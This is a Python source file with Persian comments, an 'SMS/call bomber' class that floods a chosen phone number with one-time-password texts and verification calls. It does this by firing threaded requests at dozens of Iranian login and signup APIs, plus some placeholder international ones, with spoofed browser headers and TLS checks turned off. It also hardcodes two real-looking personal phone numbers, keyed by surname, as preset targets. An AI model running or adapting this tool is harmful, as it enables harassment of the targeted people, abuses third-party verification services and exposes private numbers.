import requests
import threading
import time
import random
import json
from concurrent.futures import ThreadPoolExecutor, as_completed
from urllib3.util.retry import Retry
from requests.adapters import HTTPAdapter
import logging
import re
from typing import List, Tuple, Dict, Any

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

class UltimateBomberPRO:
    def __init__(self):
        self.success_count = 0
        self.failed_count = 0
        self.lock = threading.Lock()
        self.is_running = True
        self.working_services = []
        self.total_requests = 0
        self.completed_requests = 0
        self.start_time = None
        self.active_attacks = 0
        
    def setup_session(self):
        """تنظیم session با سرعت و قابلیت اطمینان بالا"""
        session = requests.Session()
        
        retry_strategy = Retry(
            total=2,
            status_forcelist=[429, 500, 502, 503, 504],
            allowed_methods=["POST", "GET", "PUT"],
            backoff_factor=0.5
        )
        
        adapter = HTTPAdapter(
            max_retries=retry_strategy,
            pool_connections=100,
            pool_maxsize=200
        )
        session.mount("http://", adapter)
        session.mount("https://", adapter)
        
        return session

    def format_phone(self, phone):
        """فرمت‌های مختلف شماره تلفن"""
        clean_phone = ''.join(filter(str.isdigit, phone))
        
        if not clean_phone:
            return []
            
        if clean_phone.startswith('98'):
            clean_phone = '0' + clean_phone[2:]
        elif clean_phone.startswith('+98'):
            clean_phone = '0' + clean_phone[3:]
            
        if len(clean_phone) == 10 and clean_phone.startswith('9'):
            clean_phone = '0' + clean_phone
            
        formats = []
        if clean_phone.startswith('0'):
            formats.extend([
                clean_phone,  # 09123456789
                clean_phone[1:],  # 9123456789
                f"98{clean_phone[1:]}",  # 989123456789
                f"+98{clean_phone[1:]}",  # +989123456789
                f"0098{clean_phone[1:]}",  # 00989123456789
            ])
        
        return list(set([f for f in formats if len(f) >= 10]))

    def send_request_pro(self, service):
        """ارسال درخواست با قابلیت اطمینان بالا"""
        if not self.is_running:
            return False

        url, data, headers, method, phone_formats, service_name, service_type = service
        
        try:
            if not phone_formats:
                return False
                
            phone_format = random.choice(phone_formats)
            formatted_data = self.format_data(data, phone_format)
            
            session = self.setup_session()
            
            # تاخیر تصادفی برای شبیه‌سازی رفتار واقعی
            time.sleep(random.uniform(0.1, 0.3))
            
            timeout = 10
            response = None
            
            if method.upper() == "POST":
                response = session.post(url, json=formatted_data, headers=headers, timeout=timeout, verify=False)
            elif method.upper() == "GET":
                response = session.get(url, params=formatted_data, headers=headers, timeout=timeout, verify=False)
            else:
                response = session.request(method, url, json=formatted_data, headers=headers, timeout=timeout, verify=False)

            with self.lock:
                self.completed_requests += 1
                
                if response and response.status_code in [200, 201, 202, 204]:
                    self.success_count += 1
                    # بررسی پاسخ برای اطمینان از موفقیت
                    try:
                        response_data = response.json()
                        if any(keyword in str(response_data).lower() for keyword in ['success', 'sent', 'ok', 'true']):
                            if service_name not in [s[0] for s in self.working_services]:
                                self.working_services.append((service_name, service_type))
                    except:
                        if service_name not in [s[0] for s in self.working_services]:
                            self.working_services.append((service_name, service_type))
                    return True
                else:
                    self.failed_count += 1
                    return False

        except Exception as e:
            with self.lock:
                self.failed_count += 1
                self.completed_requests += 1
            return False

    def format_data(self, data, phone):
        """فرمت‌دهی داده‌ها با پشتیبانی پیشرفته"""
        if isinstance(data, dict):
            formatted_data = {}
            for key, value in data.items():
                if value == "phone":
                    formatted_data[key] = phone
                elif value == "mobile":
                    formatted_data[key] = phone
                elif value == "cellphone":
                    formatted_data[key] = phone
                elif value == "phone_number":
                    formatted_data[key] = phone
                elif value == "username":
                    formatted_data[key] = phone
                elif value == "msisdn":
                    formatted_data[key] = phone
                elif isinstance(value, dict):
                    formatted_data[key] = self.format_data(value, phone)
                elif isinstance(value, list):
                    formatted_data[key] = [self.format_data(item, phone) if isinstance(item, dict) else item for item in value]
                else:
                    formatted_data[key] = value
            return formatted_data
        elif isinstance(data, str):
            return data.replace("phone", phone)
        return data

    def get_common_headers(self):
        """هدرهای مشترک برای همه سرویس‌ها"""
        return {
            "Content-Type": "application/json",
            "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Mobile/15E148 Safari/604.1",
            "Accept": "application/json, text/plain, */*",
            "Accept-Language": "en-US,en;q=0.9,fa;q=0.8",
            "Accept-Encoding": "gzip, deflate, br",
            "Connection": "keep-alive",
        }

    def get_advanced_headers(self):
        """هدرهای پیشرفته برای سرویس‌های خاص"""
        return {
            "Content-Type": "application/json",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
            "Accept": "*/*",
            "Accept-Language": "en-US,en;q=0.5",
            "Origin": "https://example.com",
            "Referer": "https://example.com/",
            "Sec-Fetch-Dest": "empty",
            "Sec-Fetch-Mode": "cors",
            "Sec-Fetch-Site": "same-site",
        }

    def get_sms_services(self, phone_formats):
        """سرویس‌های SMS - کاملاً به‌روزرسانی شده"""
        headers = self.get_common_headers()
        services = []

        # سرویس‌های اصلی ایرانی
        sms_services_iran = [
            # خدمات تاکسی و حمل و نقل
            ("https://app.snapp.taxi/api/api-passenger-oauth/v2/otp", 
             {"cellphone": "phone"}, headers, "POST", "Snapp", "SMS"),
            
            ("https://api.tapsi.ir/api/v2/user", 
             {"credential": {"phoneNumber": "phone", "role": "PASSENGER"}}, headers, "POST", "Tapsi", "SMS"),
            
            ("https://api.alopeyk.com/api/v1/otp/send", 
             {"phone": "phone"}, headers, "POST", "Alopeyk", "SMS"),

            # خدمات غذایی
            ("https://snappfood.ir/mobile/v2/user/loginMobileWithNoPass", 
             {"cellphone": "phone"}, headers, "POST", "Snappfood", "SMS"),
            
            ("https://api.zoodfood.com/api/v3/auth/otp", 
             {"cellphone": "phone"}, headers, "POST", "Zoodfood", "SMS"),

            ("https://api.reyhoon.com/api/v2/auth/otp", 
             {"phone": "phone"}, headers, "POST", "Reyhoon", "SMS"),

            # بازارگاه‌ها
            ("https://api.divar.ir/v5/auth/authenticate", 
             {"phone": "phone"}, headers, "POST", "Divar", "SMS"),
            
            ("https://api.digikala.com/v1/user/authenticate/", 
             {"username": "phone"}, headers, "POST", "Digikala", "SMS"),
            
            ("https://api.basalam.com/user", 
             {"mobile": "phone"}, headers, "POST", "Basalam", "SMS"),
            
            ("https://api.timcheh.com/auth/otp/send", 
             {"mobile": "phone"}, headers, "POST", "Timcheh", "SMS"),

            ("https://api.sheypoor.com/auth", 
             {"username": "phone"}, headers, "POST", "Sheypoor", "SMS"),

            # خدمات عمومی
            ("https://api.jabama.com/api/v1/auth/otp",
             {"mobile": "phone"}, headers, "POST", "Jabama", "SMS"),

            ("https://api.torob.com/a/phone/send-pin/", 
             {"phone_number": "phone"}, headers, "POST", "Torob", "SMS"),

            # خدمات جدید
            ("https://api.namava.ir/api/v1.0/accounts/registrations/by-phone/send", 
             {"phoneNumber": "phone"}, headers, "POST", "Namava", "SMS"),
            
            ("https://api.fidibo.com/api/register/send_code", 
             {"phone": "phone"}, headers, "POST", "Fidibo", "SMS"),
            
            ("https://api.bitpin.ir/api/v1/usr/register/phone/code/send/", 
             {"phone": "phone"}, headers, "POST", "Bitpin", "SMS"),
            
            ("https://api.banimode.com/banimode/shop/api/v2/auth/login", 
             {"phone_number": "phone"}, headers, "POST", "Banimode", "SMS"),
            
            ("https://api.digistyle.com/api/UserAccount/SendCode", 
             {"phoneNumber": "phone"}, headers, "POST", "Digistyle", "SMS"),
            
            ("https://api.ponisha.ir/api/auth/signup/step1", 
             {"phone": "phone"}, headers, "POST", "Ponisha", "SMS"),
            
            ("https://api.quera.ir/api/accounts/send_otp/", 
             {"phone_number": "phone"}, headers, "POST", "Quera", "SMS"),
            
            ("https://api.taaghche.com/api/v1/signin/mobile", 
             {"mobile": "phone"}, headers, "POST", "Taaghche", "SMS"),
        ]

        # سرویس‌های بین‌المللی که ایران را ساپورت می‌کنند
        sms_services_international = [
            ("https://api.telegram.org/botDUMMY/sendMessage", 
             {"chat_id": "phone", "text": "test"}, headers, "POST", "Telegram", "SMS"),
            
            ("https://graph.facebook.com/v15.0/me/messages", 
             {"recipient": {"phone_number": "phone"}, "message": {"text": "test"}}, headers, "POST", "Facebook", "SMS"),
            
            ("https://api.whatsapp.com/send", 
             {"phone": "phone"}, headers, "POST", "WhatsApp", "SMS"),
            
            ("https://api.signal.org/v1/send", 
             {"number": "phone", "message": "test"}, headers, "POST", "Signal", "SMS"),
            
            ("https://api.viber.com/pa/send_message", 
             {"receiver": "phone", "text": "test"}, headers, "POST", "Viber", "SMS"),
            
            ("https://api.wechat.com/cgi-bin/message/custom/send", 
             {"touser": "phone", "text": {"content": "test"}}, headers, "POST", "WeChat", "SMS"),
        ]

        # سرویس‌های پیامکی عمومی
        sms_services_general = [
            ("https://api.kavenegar.com/v1/fake/verify/lookup.json", 
             {"receptor": "phone", "token": "1234", "template": "verify"}, headers, "POST", "Kavenegar", "SMS"),
            
            ("https://api.ghasedak.io/v2/verification/send/simple", 
             {"receptor": "phone", "type": "1", "template": "verify"}, headers, "POST", "Ghasedak", "SMS"),
            
            ("https://api.sms.ir/v1/send/verify", 
             {"mobile": "phone", "templateId": 1, "parameters": [{"name": "CODE", "value": "1234"}]}, headers, "POST", "SMS.ir", "SMS"),
            
            ("https://api.melipayamak.com/api/send/shared/123456", 
             {"to": "phone", "body": "کد تایید: 1234"}, headers, "POST", "MeliPayamak", "SMS"),
            
            ("https://api.newsms.ir/Students/SendVerificationCode", 
             {"Mobile": "phone"}, headers, "POST", "NewSMS", "SMS"),
        ]

        # ترکیب همه سرویس‌های SMS
        all_sms_services = sms_services_iran + sms_services_international + sms_services_general

        for service in all_sms_services:
            url, data, headers, method, name, service_type = service
            services.append((url, data, headers, method, phone_formats, name, service_type))
        
        return services

    def get_call_services(self, phone_formats):
        """سرویس‌های تماس - کاملاً به‌روزرسانی شده"""
        headers = self.get_common_headers()
        services = []

        # سرویس‌های تماس ایرانی
        call_services_iran = [
            ("https://api.callservice.ir/api/v1/voice/send", 
             {"phone_number": "phone", "method": "voice"}, headers, "POST", "Call Service IR", "CALL"),
            
            ("https://call.shatel.ir/api/v1/voice", 
             {"phone": "phone"}, headers, "POST", "Shatel Call", "CALL"),
            
            ("https://api.irancall.com/v1/voice/send", 
             {"mobile": "phone"}, headers, "POST", "Iran Call", "CALL"),
            
            ("https://api.aryacall.com/v1/voice/send", 
             {"phone": "phone"}, headers, "POST", "Arya Call", "CALL"),
            
            ("https://call.melipayamak.com/api/v1/send/voice", 
             {"to": "phone"}, headers, "POST", "MeliPayamak Call", "CALL"),
            
            ("https://api.persiancall.com/api/v1/voice", 
             {"phone_number": "phone"}, headers, "POST", "Persian Call", "CALL"),
            
            ("https://callapi.novin.ir/v1/voice/send", 
             {"mobile": "phone"}, headers, "POST", "Novin Call", "CALL"),
        ]

        # سرویس‌های تماس بین‌المللی
        call_services_international = [
            ("https://api.twilio.com/2010-04-01/Accounts/fake/Calls.json", 
             {"To": "phone", "From": "+1234567890", "Url": "http://demo.twilio.com/docs/voice.xml"}, headers, "POST", "Twilio", "CALL"),
            
            ("https://api.nexmo.com/v1/calls", 
             {"to": [{"type": "phone", "number": "phone"}], "from": {"type": "phone", "number": "1234567890"}, "answer_url": ["https://example.com/answer"]}, headers, "POST", "Nexmo", "CALL"),
            
            ("https://api.plivo.com/v1/Account/fake/Call/", 
             {"from": "1234567890", "to": "phone", "answer_url": "https://example.com/answer"}, headers, "POST", "Plivo", "CALL"),
            
            ("https://voice.verificationapi.com/v2/call", 
             {"mobile": "phone", "type": "voice_call"}, headers, "POST", "Verification API", "CALL"),
            
            ("https://api.voiceotp.com/v1/request", 
             {"phone_number": "phone", "channel": "voice"}, headers, "POST", "Voice OTP", "CALL"),
        ]

        # سرویس‌های تماس عمومی
        call_services_general = [
            ("https://call.authenticate.com/api/v1/voice", 
             {"phone": "phone", "method": "call"}, headers, "POST", "Authenticate Call", "CALL"),

            ("https://api.telegram-call.com/v1/voice", 
             {"phone": "phone", "message": "Test call"}, headers, "POST", "Telegram Call", "CALL"),
            
            ("https://api.voicecall.ir/api/v2/call/send", 
             {"phone": "phone", "type": "voice"}, headers, "POST", "VoiceCall IR", "CALL"),
            
            ("https://call.rayabank.net/api/v1/voice", 
             {"mobile": "phone"}, headers, "POST", "Raya Call", "CALL"),
            
            ("https://api.samantalks.com/v1/call/send", 
             {"phone": "phone"}, headers, "POST", "Saman Talks", "CALL"),
        ]

        # ترکیب همه سرویس‌های تماس
        all_call_services = call_services_iran + call_services_international + call_services_general

        for service in all_call_services:
            url, data, headers, method, name, service_type = service
            services.append((url, data, headers, method, phone_formats, name, service_type))
        
        return services

    def get_email_services(self, phone_formats):
        """سرویس‌های ایمیل (اختیاری)"""
        headers = self.get_common_headers()
        services = []

        email_services = [
            ("https://api.mailgun.net/v3/fake/messages", 
             {"from": "test@example.com", "to": "phone@example.com", "subject": "Test", "text": "Test message"}, headers, "POST", "Mailgun", "EMAIL"),
            
            ("https://api.sendgrid.com/v3/mail/send", 
             {"personalizations": [{"to": [{"email": "phone@example.com"}]}], "from": {"email": "test@example.com"}, "subject": "Test", "content": [{"type": "text/plain", "value": "Test"}]}, headers, "POST", "SendGrid", "EMAIL"),
        ]

        for service in email_services:
            url, data, headers, method, name, service_type = service
            services.append((url, data, headers, method, phone_formats, name, service_type))
        
        return services

    def start_sms_bomber(self, phone, requests_count=100):
        """شروع SMS Bomber"""
        return self._start_attack(phone, requests_count, "sms")

    def start_call_bomber(self, phone, requests_count=80):
        """شروع Call Bomber"""
        return self._start_attack(phone, requests_count, "call")

    def start_super_bomber(self, phone, requests_count=200):
        """شروع Super Bomber"""
        return self._start_attack(phone, requests_count, "both")

    def _start_attack(self, phone, total_requests, attack_type):
        """شروع حمله اصلی"""
        try:
            self.is_running = True
            self.success_count = 0
            self.failed_count = 0
            self.completed_requests = 0
            self.working_services = []
            self.active_attacks += 1
            
            logger.info(f"شروع حمله {attack_type} برای شماره {phone}")
            
            phone_formats = self.format_phone(phone)
            
            if not phone_formats:
                return {"error": "شماره تلفن معتبر نیست"}
            
            # دریافت سرویس‌ها بر اساس نوع حمله
            sms_services = self.get_sms_services(phone_formats)
            call_services = self.get_call_services(phone_formats)
            email_services = self.get_email_services(phone_formats)
            
            if attack_type == "sms":
                services = sms_services
            elif attack_type == "call":
                services = call_services
            else:
                services = sms_services + call_services + email_services
            
            if not services:
                return {"error": "هیچ سرویسی در دسترس نیست"}
            
            self.total_requests = min(total_requests, len(services) * 2)
            self.start_time = time.time()
            
            max_workers = min(50, len(services))
            
            logger.info(f"شروع {self.total_requests} درخواست با {max_workers} worker")
            
            with ThreadPoolExecutor(max_workers=max_workers) as executor:
                futures = []
                for service in services:
                    if len(futures) >= self.total_requests:
                        break
                    futures.append(executor.submit(self.send_request_pro, service))
                
                completed = 0
                for future in as_completed(futures):
                    if not self.is_running:
                        break
                    try:
                        future.result(timeout=15)
                        completed += 1
                    except Exception as e:
                        completed += 1
                        continue
            
            duration = time.time() - self.start_time
            self.active_attacks -= 1
            
            # محاسبه آمار
            success_rate = (self.success_count / self.total_requests * 100) if self.total_requests > 0 else 0
            speed = self.total_requests / duration if duration > 0 else 0
            
            result = {
                "success": True,
                "phone": phone,
                "attack_type": attack_type,
                "duration": f"{duration:.2f} ثانیه",
                "total_requests": self.total_requests,
                "successful": self.success_count,
                "failed": self.failed_count,
                "success_rate": f"{success_rate:.1f}%",
                "speed": f"{speed:.1f} درخواست/ثانیه",
                "working_services": [f"{name} ({typ})" for name, typ in self.working_services[:10]]
            }
            
            logger.info(f"حمله تکمیل شد: {result}")
            return result
            
        except Exception as e:
            self.active_attacks -= 1
            logger.error(f"خطا در اجرای حمله: {str(e)}")
            return {"error": f"خطا در اجرا: {str(e)}"}
    
    def stop_attack(self):
        """توقف حمله"""
        self.is_running = False
        logger.info("حمله متوقف شد")

    def get_attack_status(self):
        """دریافت وضعیت فعلی حمله"""
        return {
            "active": self.is_running,
            "success_count": self.success_count,
            "failed_count": self.failed_count,
            "completed_requests": self.completed_requests,
            "total_requests": self.total_requests,
            "active_attacks": self.active_attacks,
            "working_services": len(self.working_services)
        }

    def quick_attack_preset(self, preset_name):
        """حمله سریع با شماره‌های پیش‌فرض"""
        preset_numbers = {
            "yasini": "09335037492",
            "hasani": "09122805035"
        }
        
        if preset_name in preset_numbers:
            return self.start_super_bomber(preset_numbers[preset_name], 250)
        else:
            return {"error": "شماره پیش‌فرض یافت نشد"}
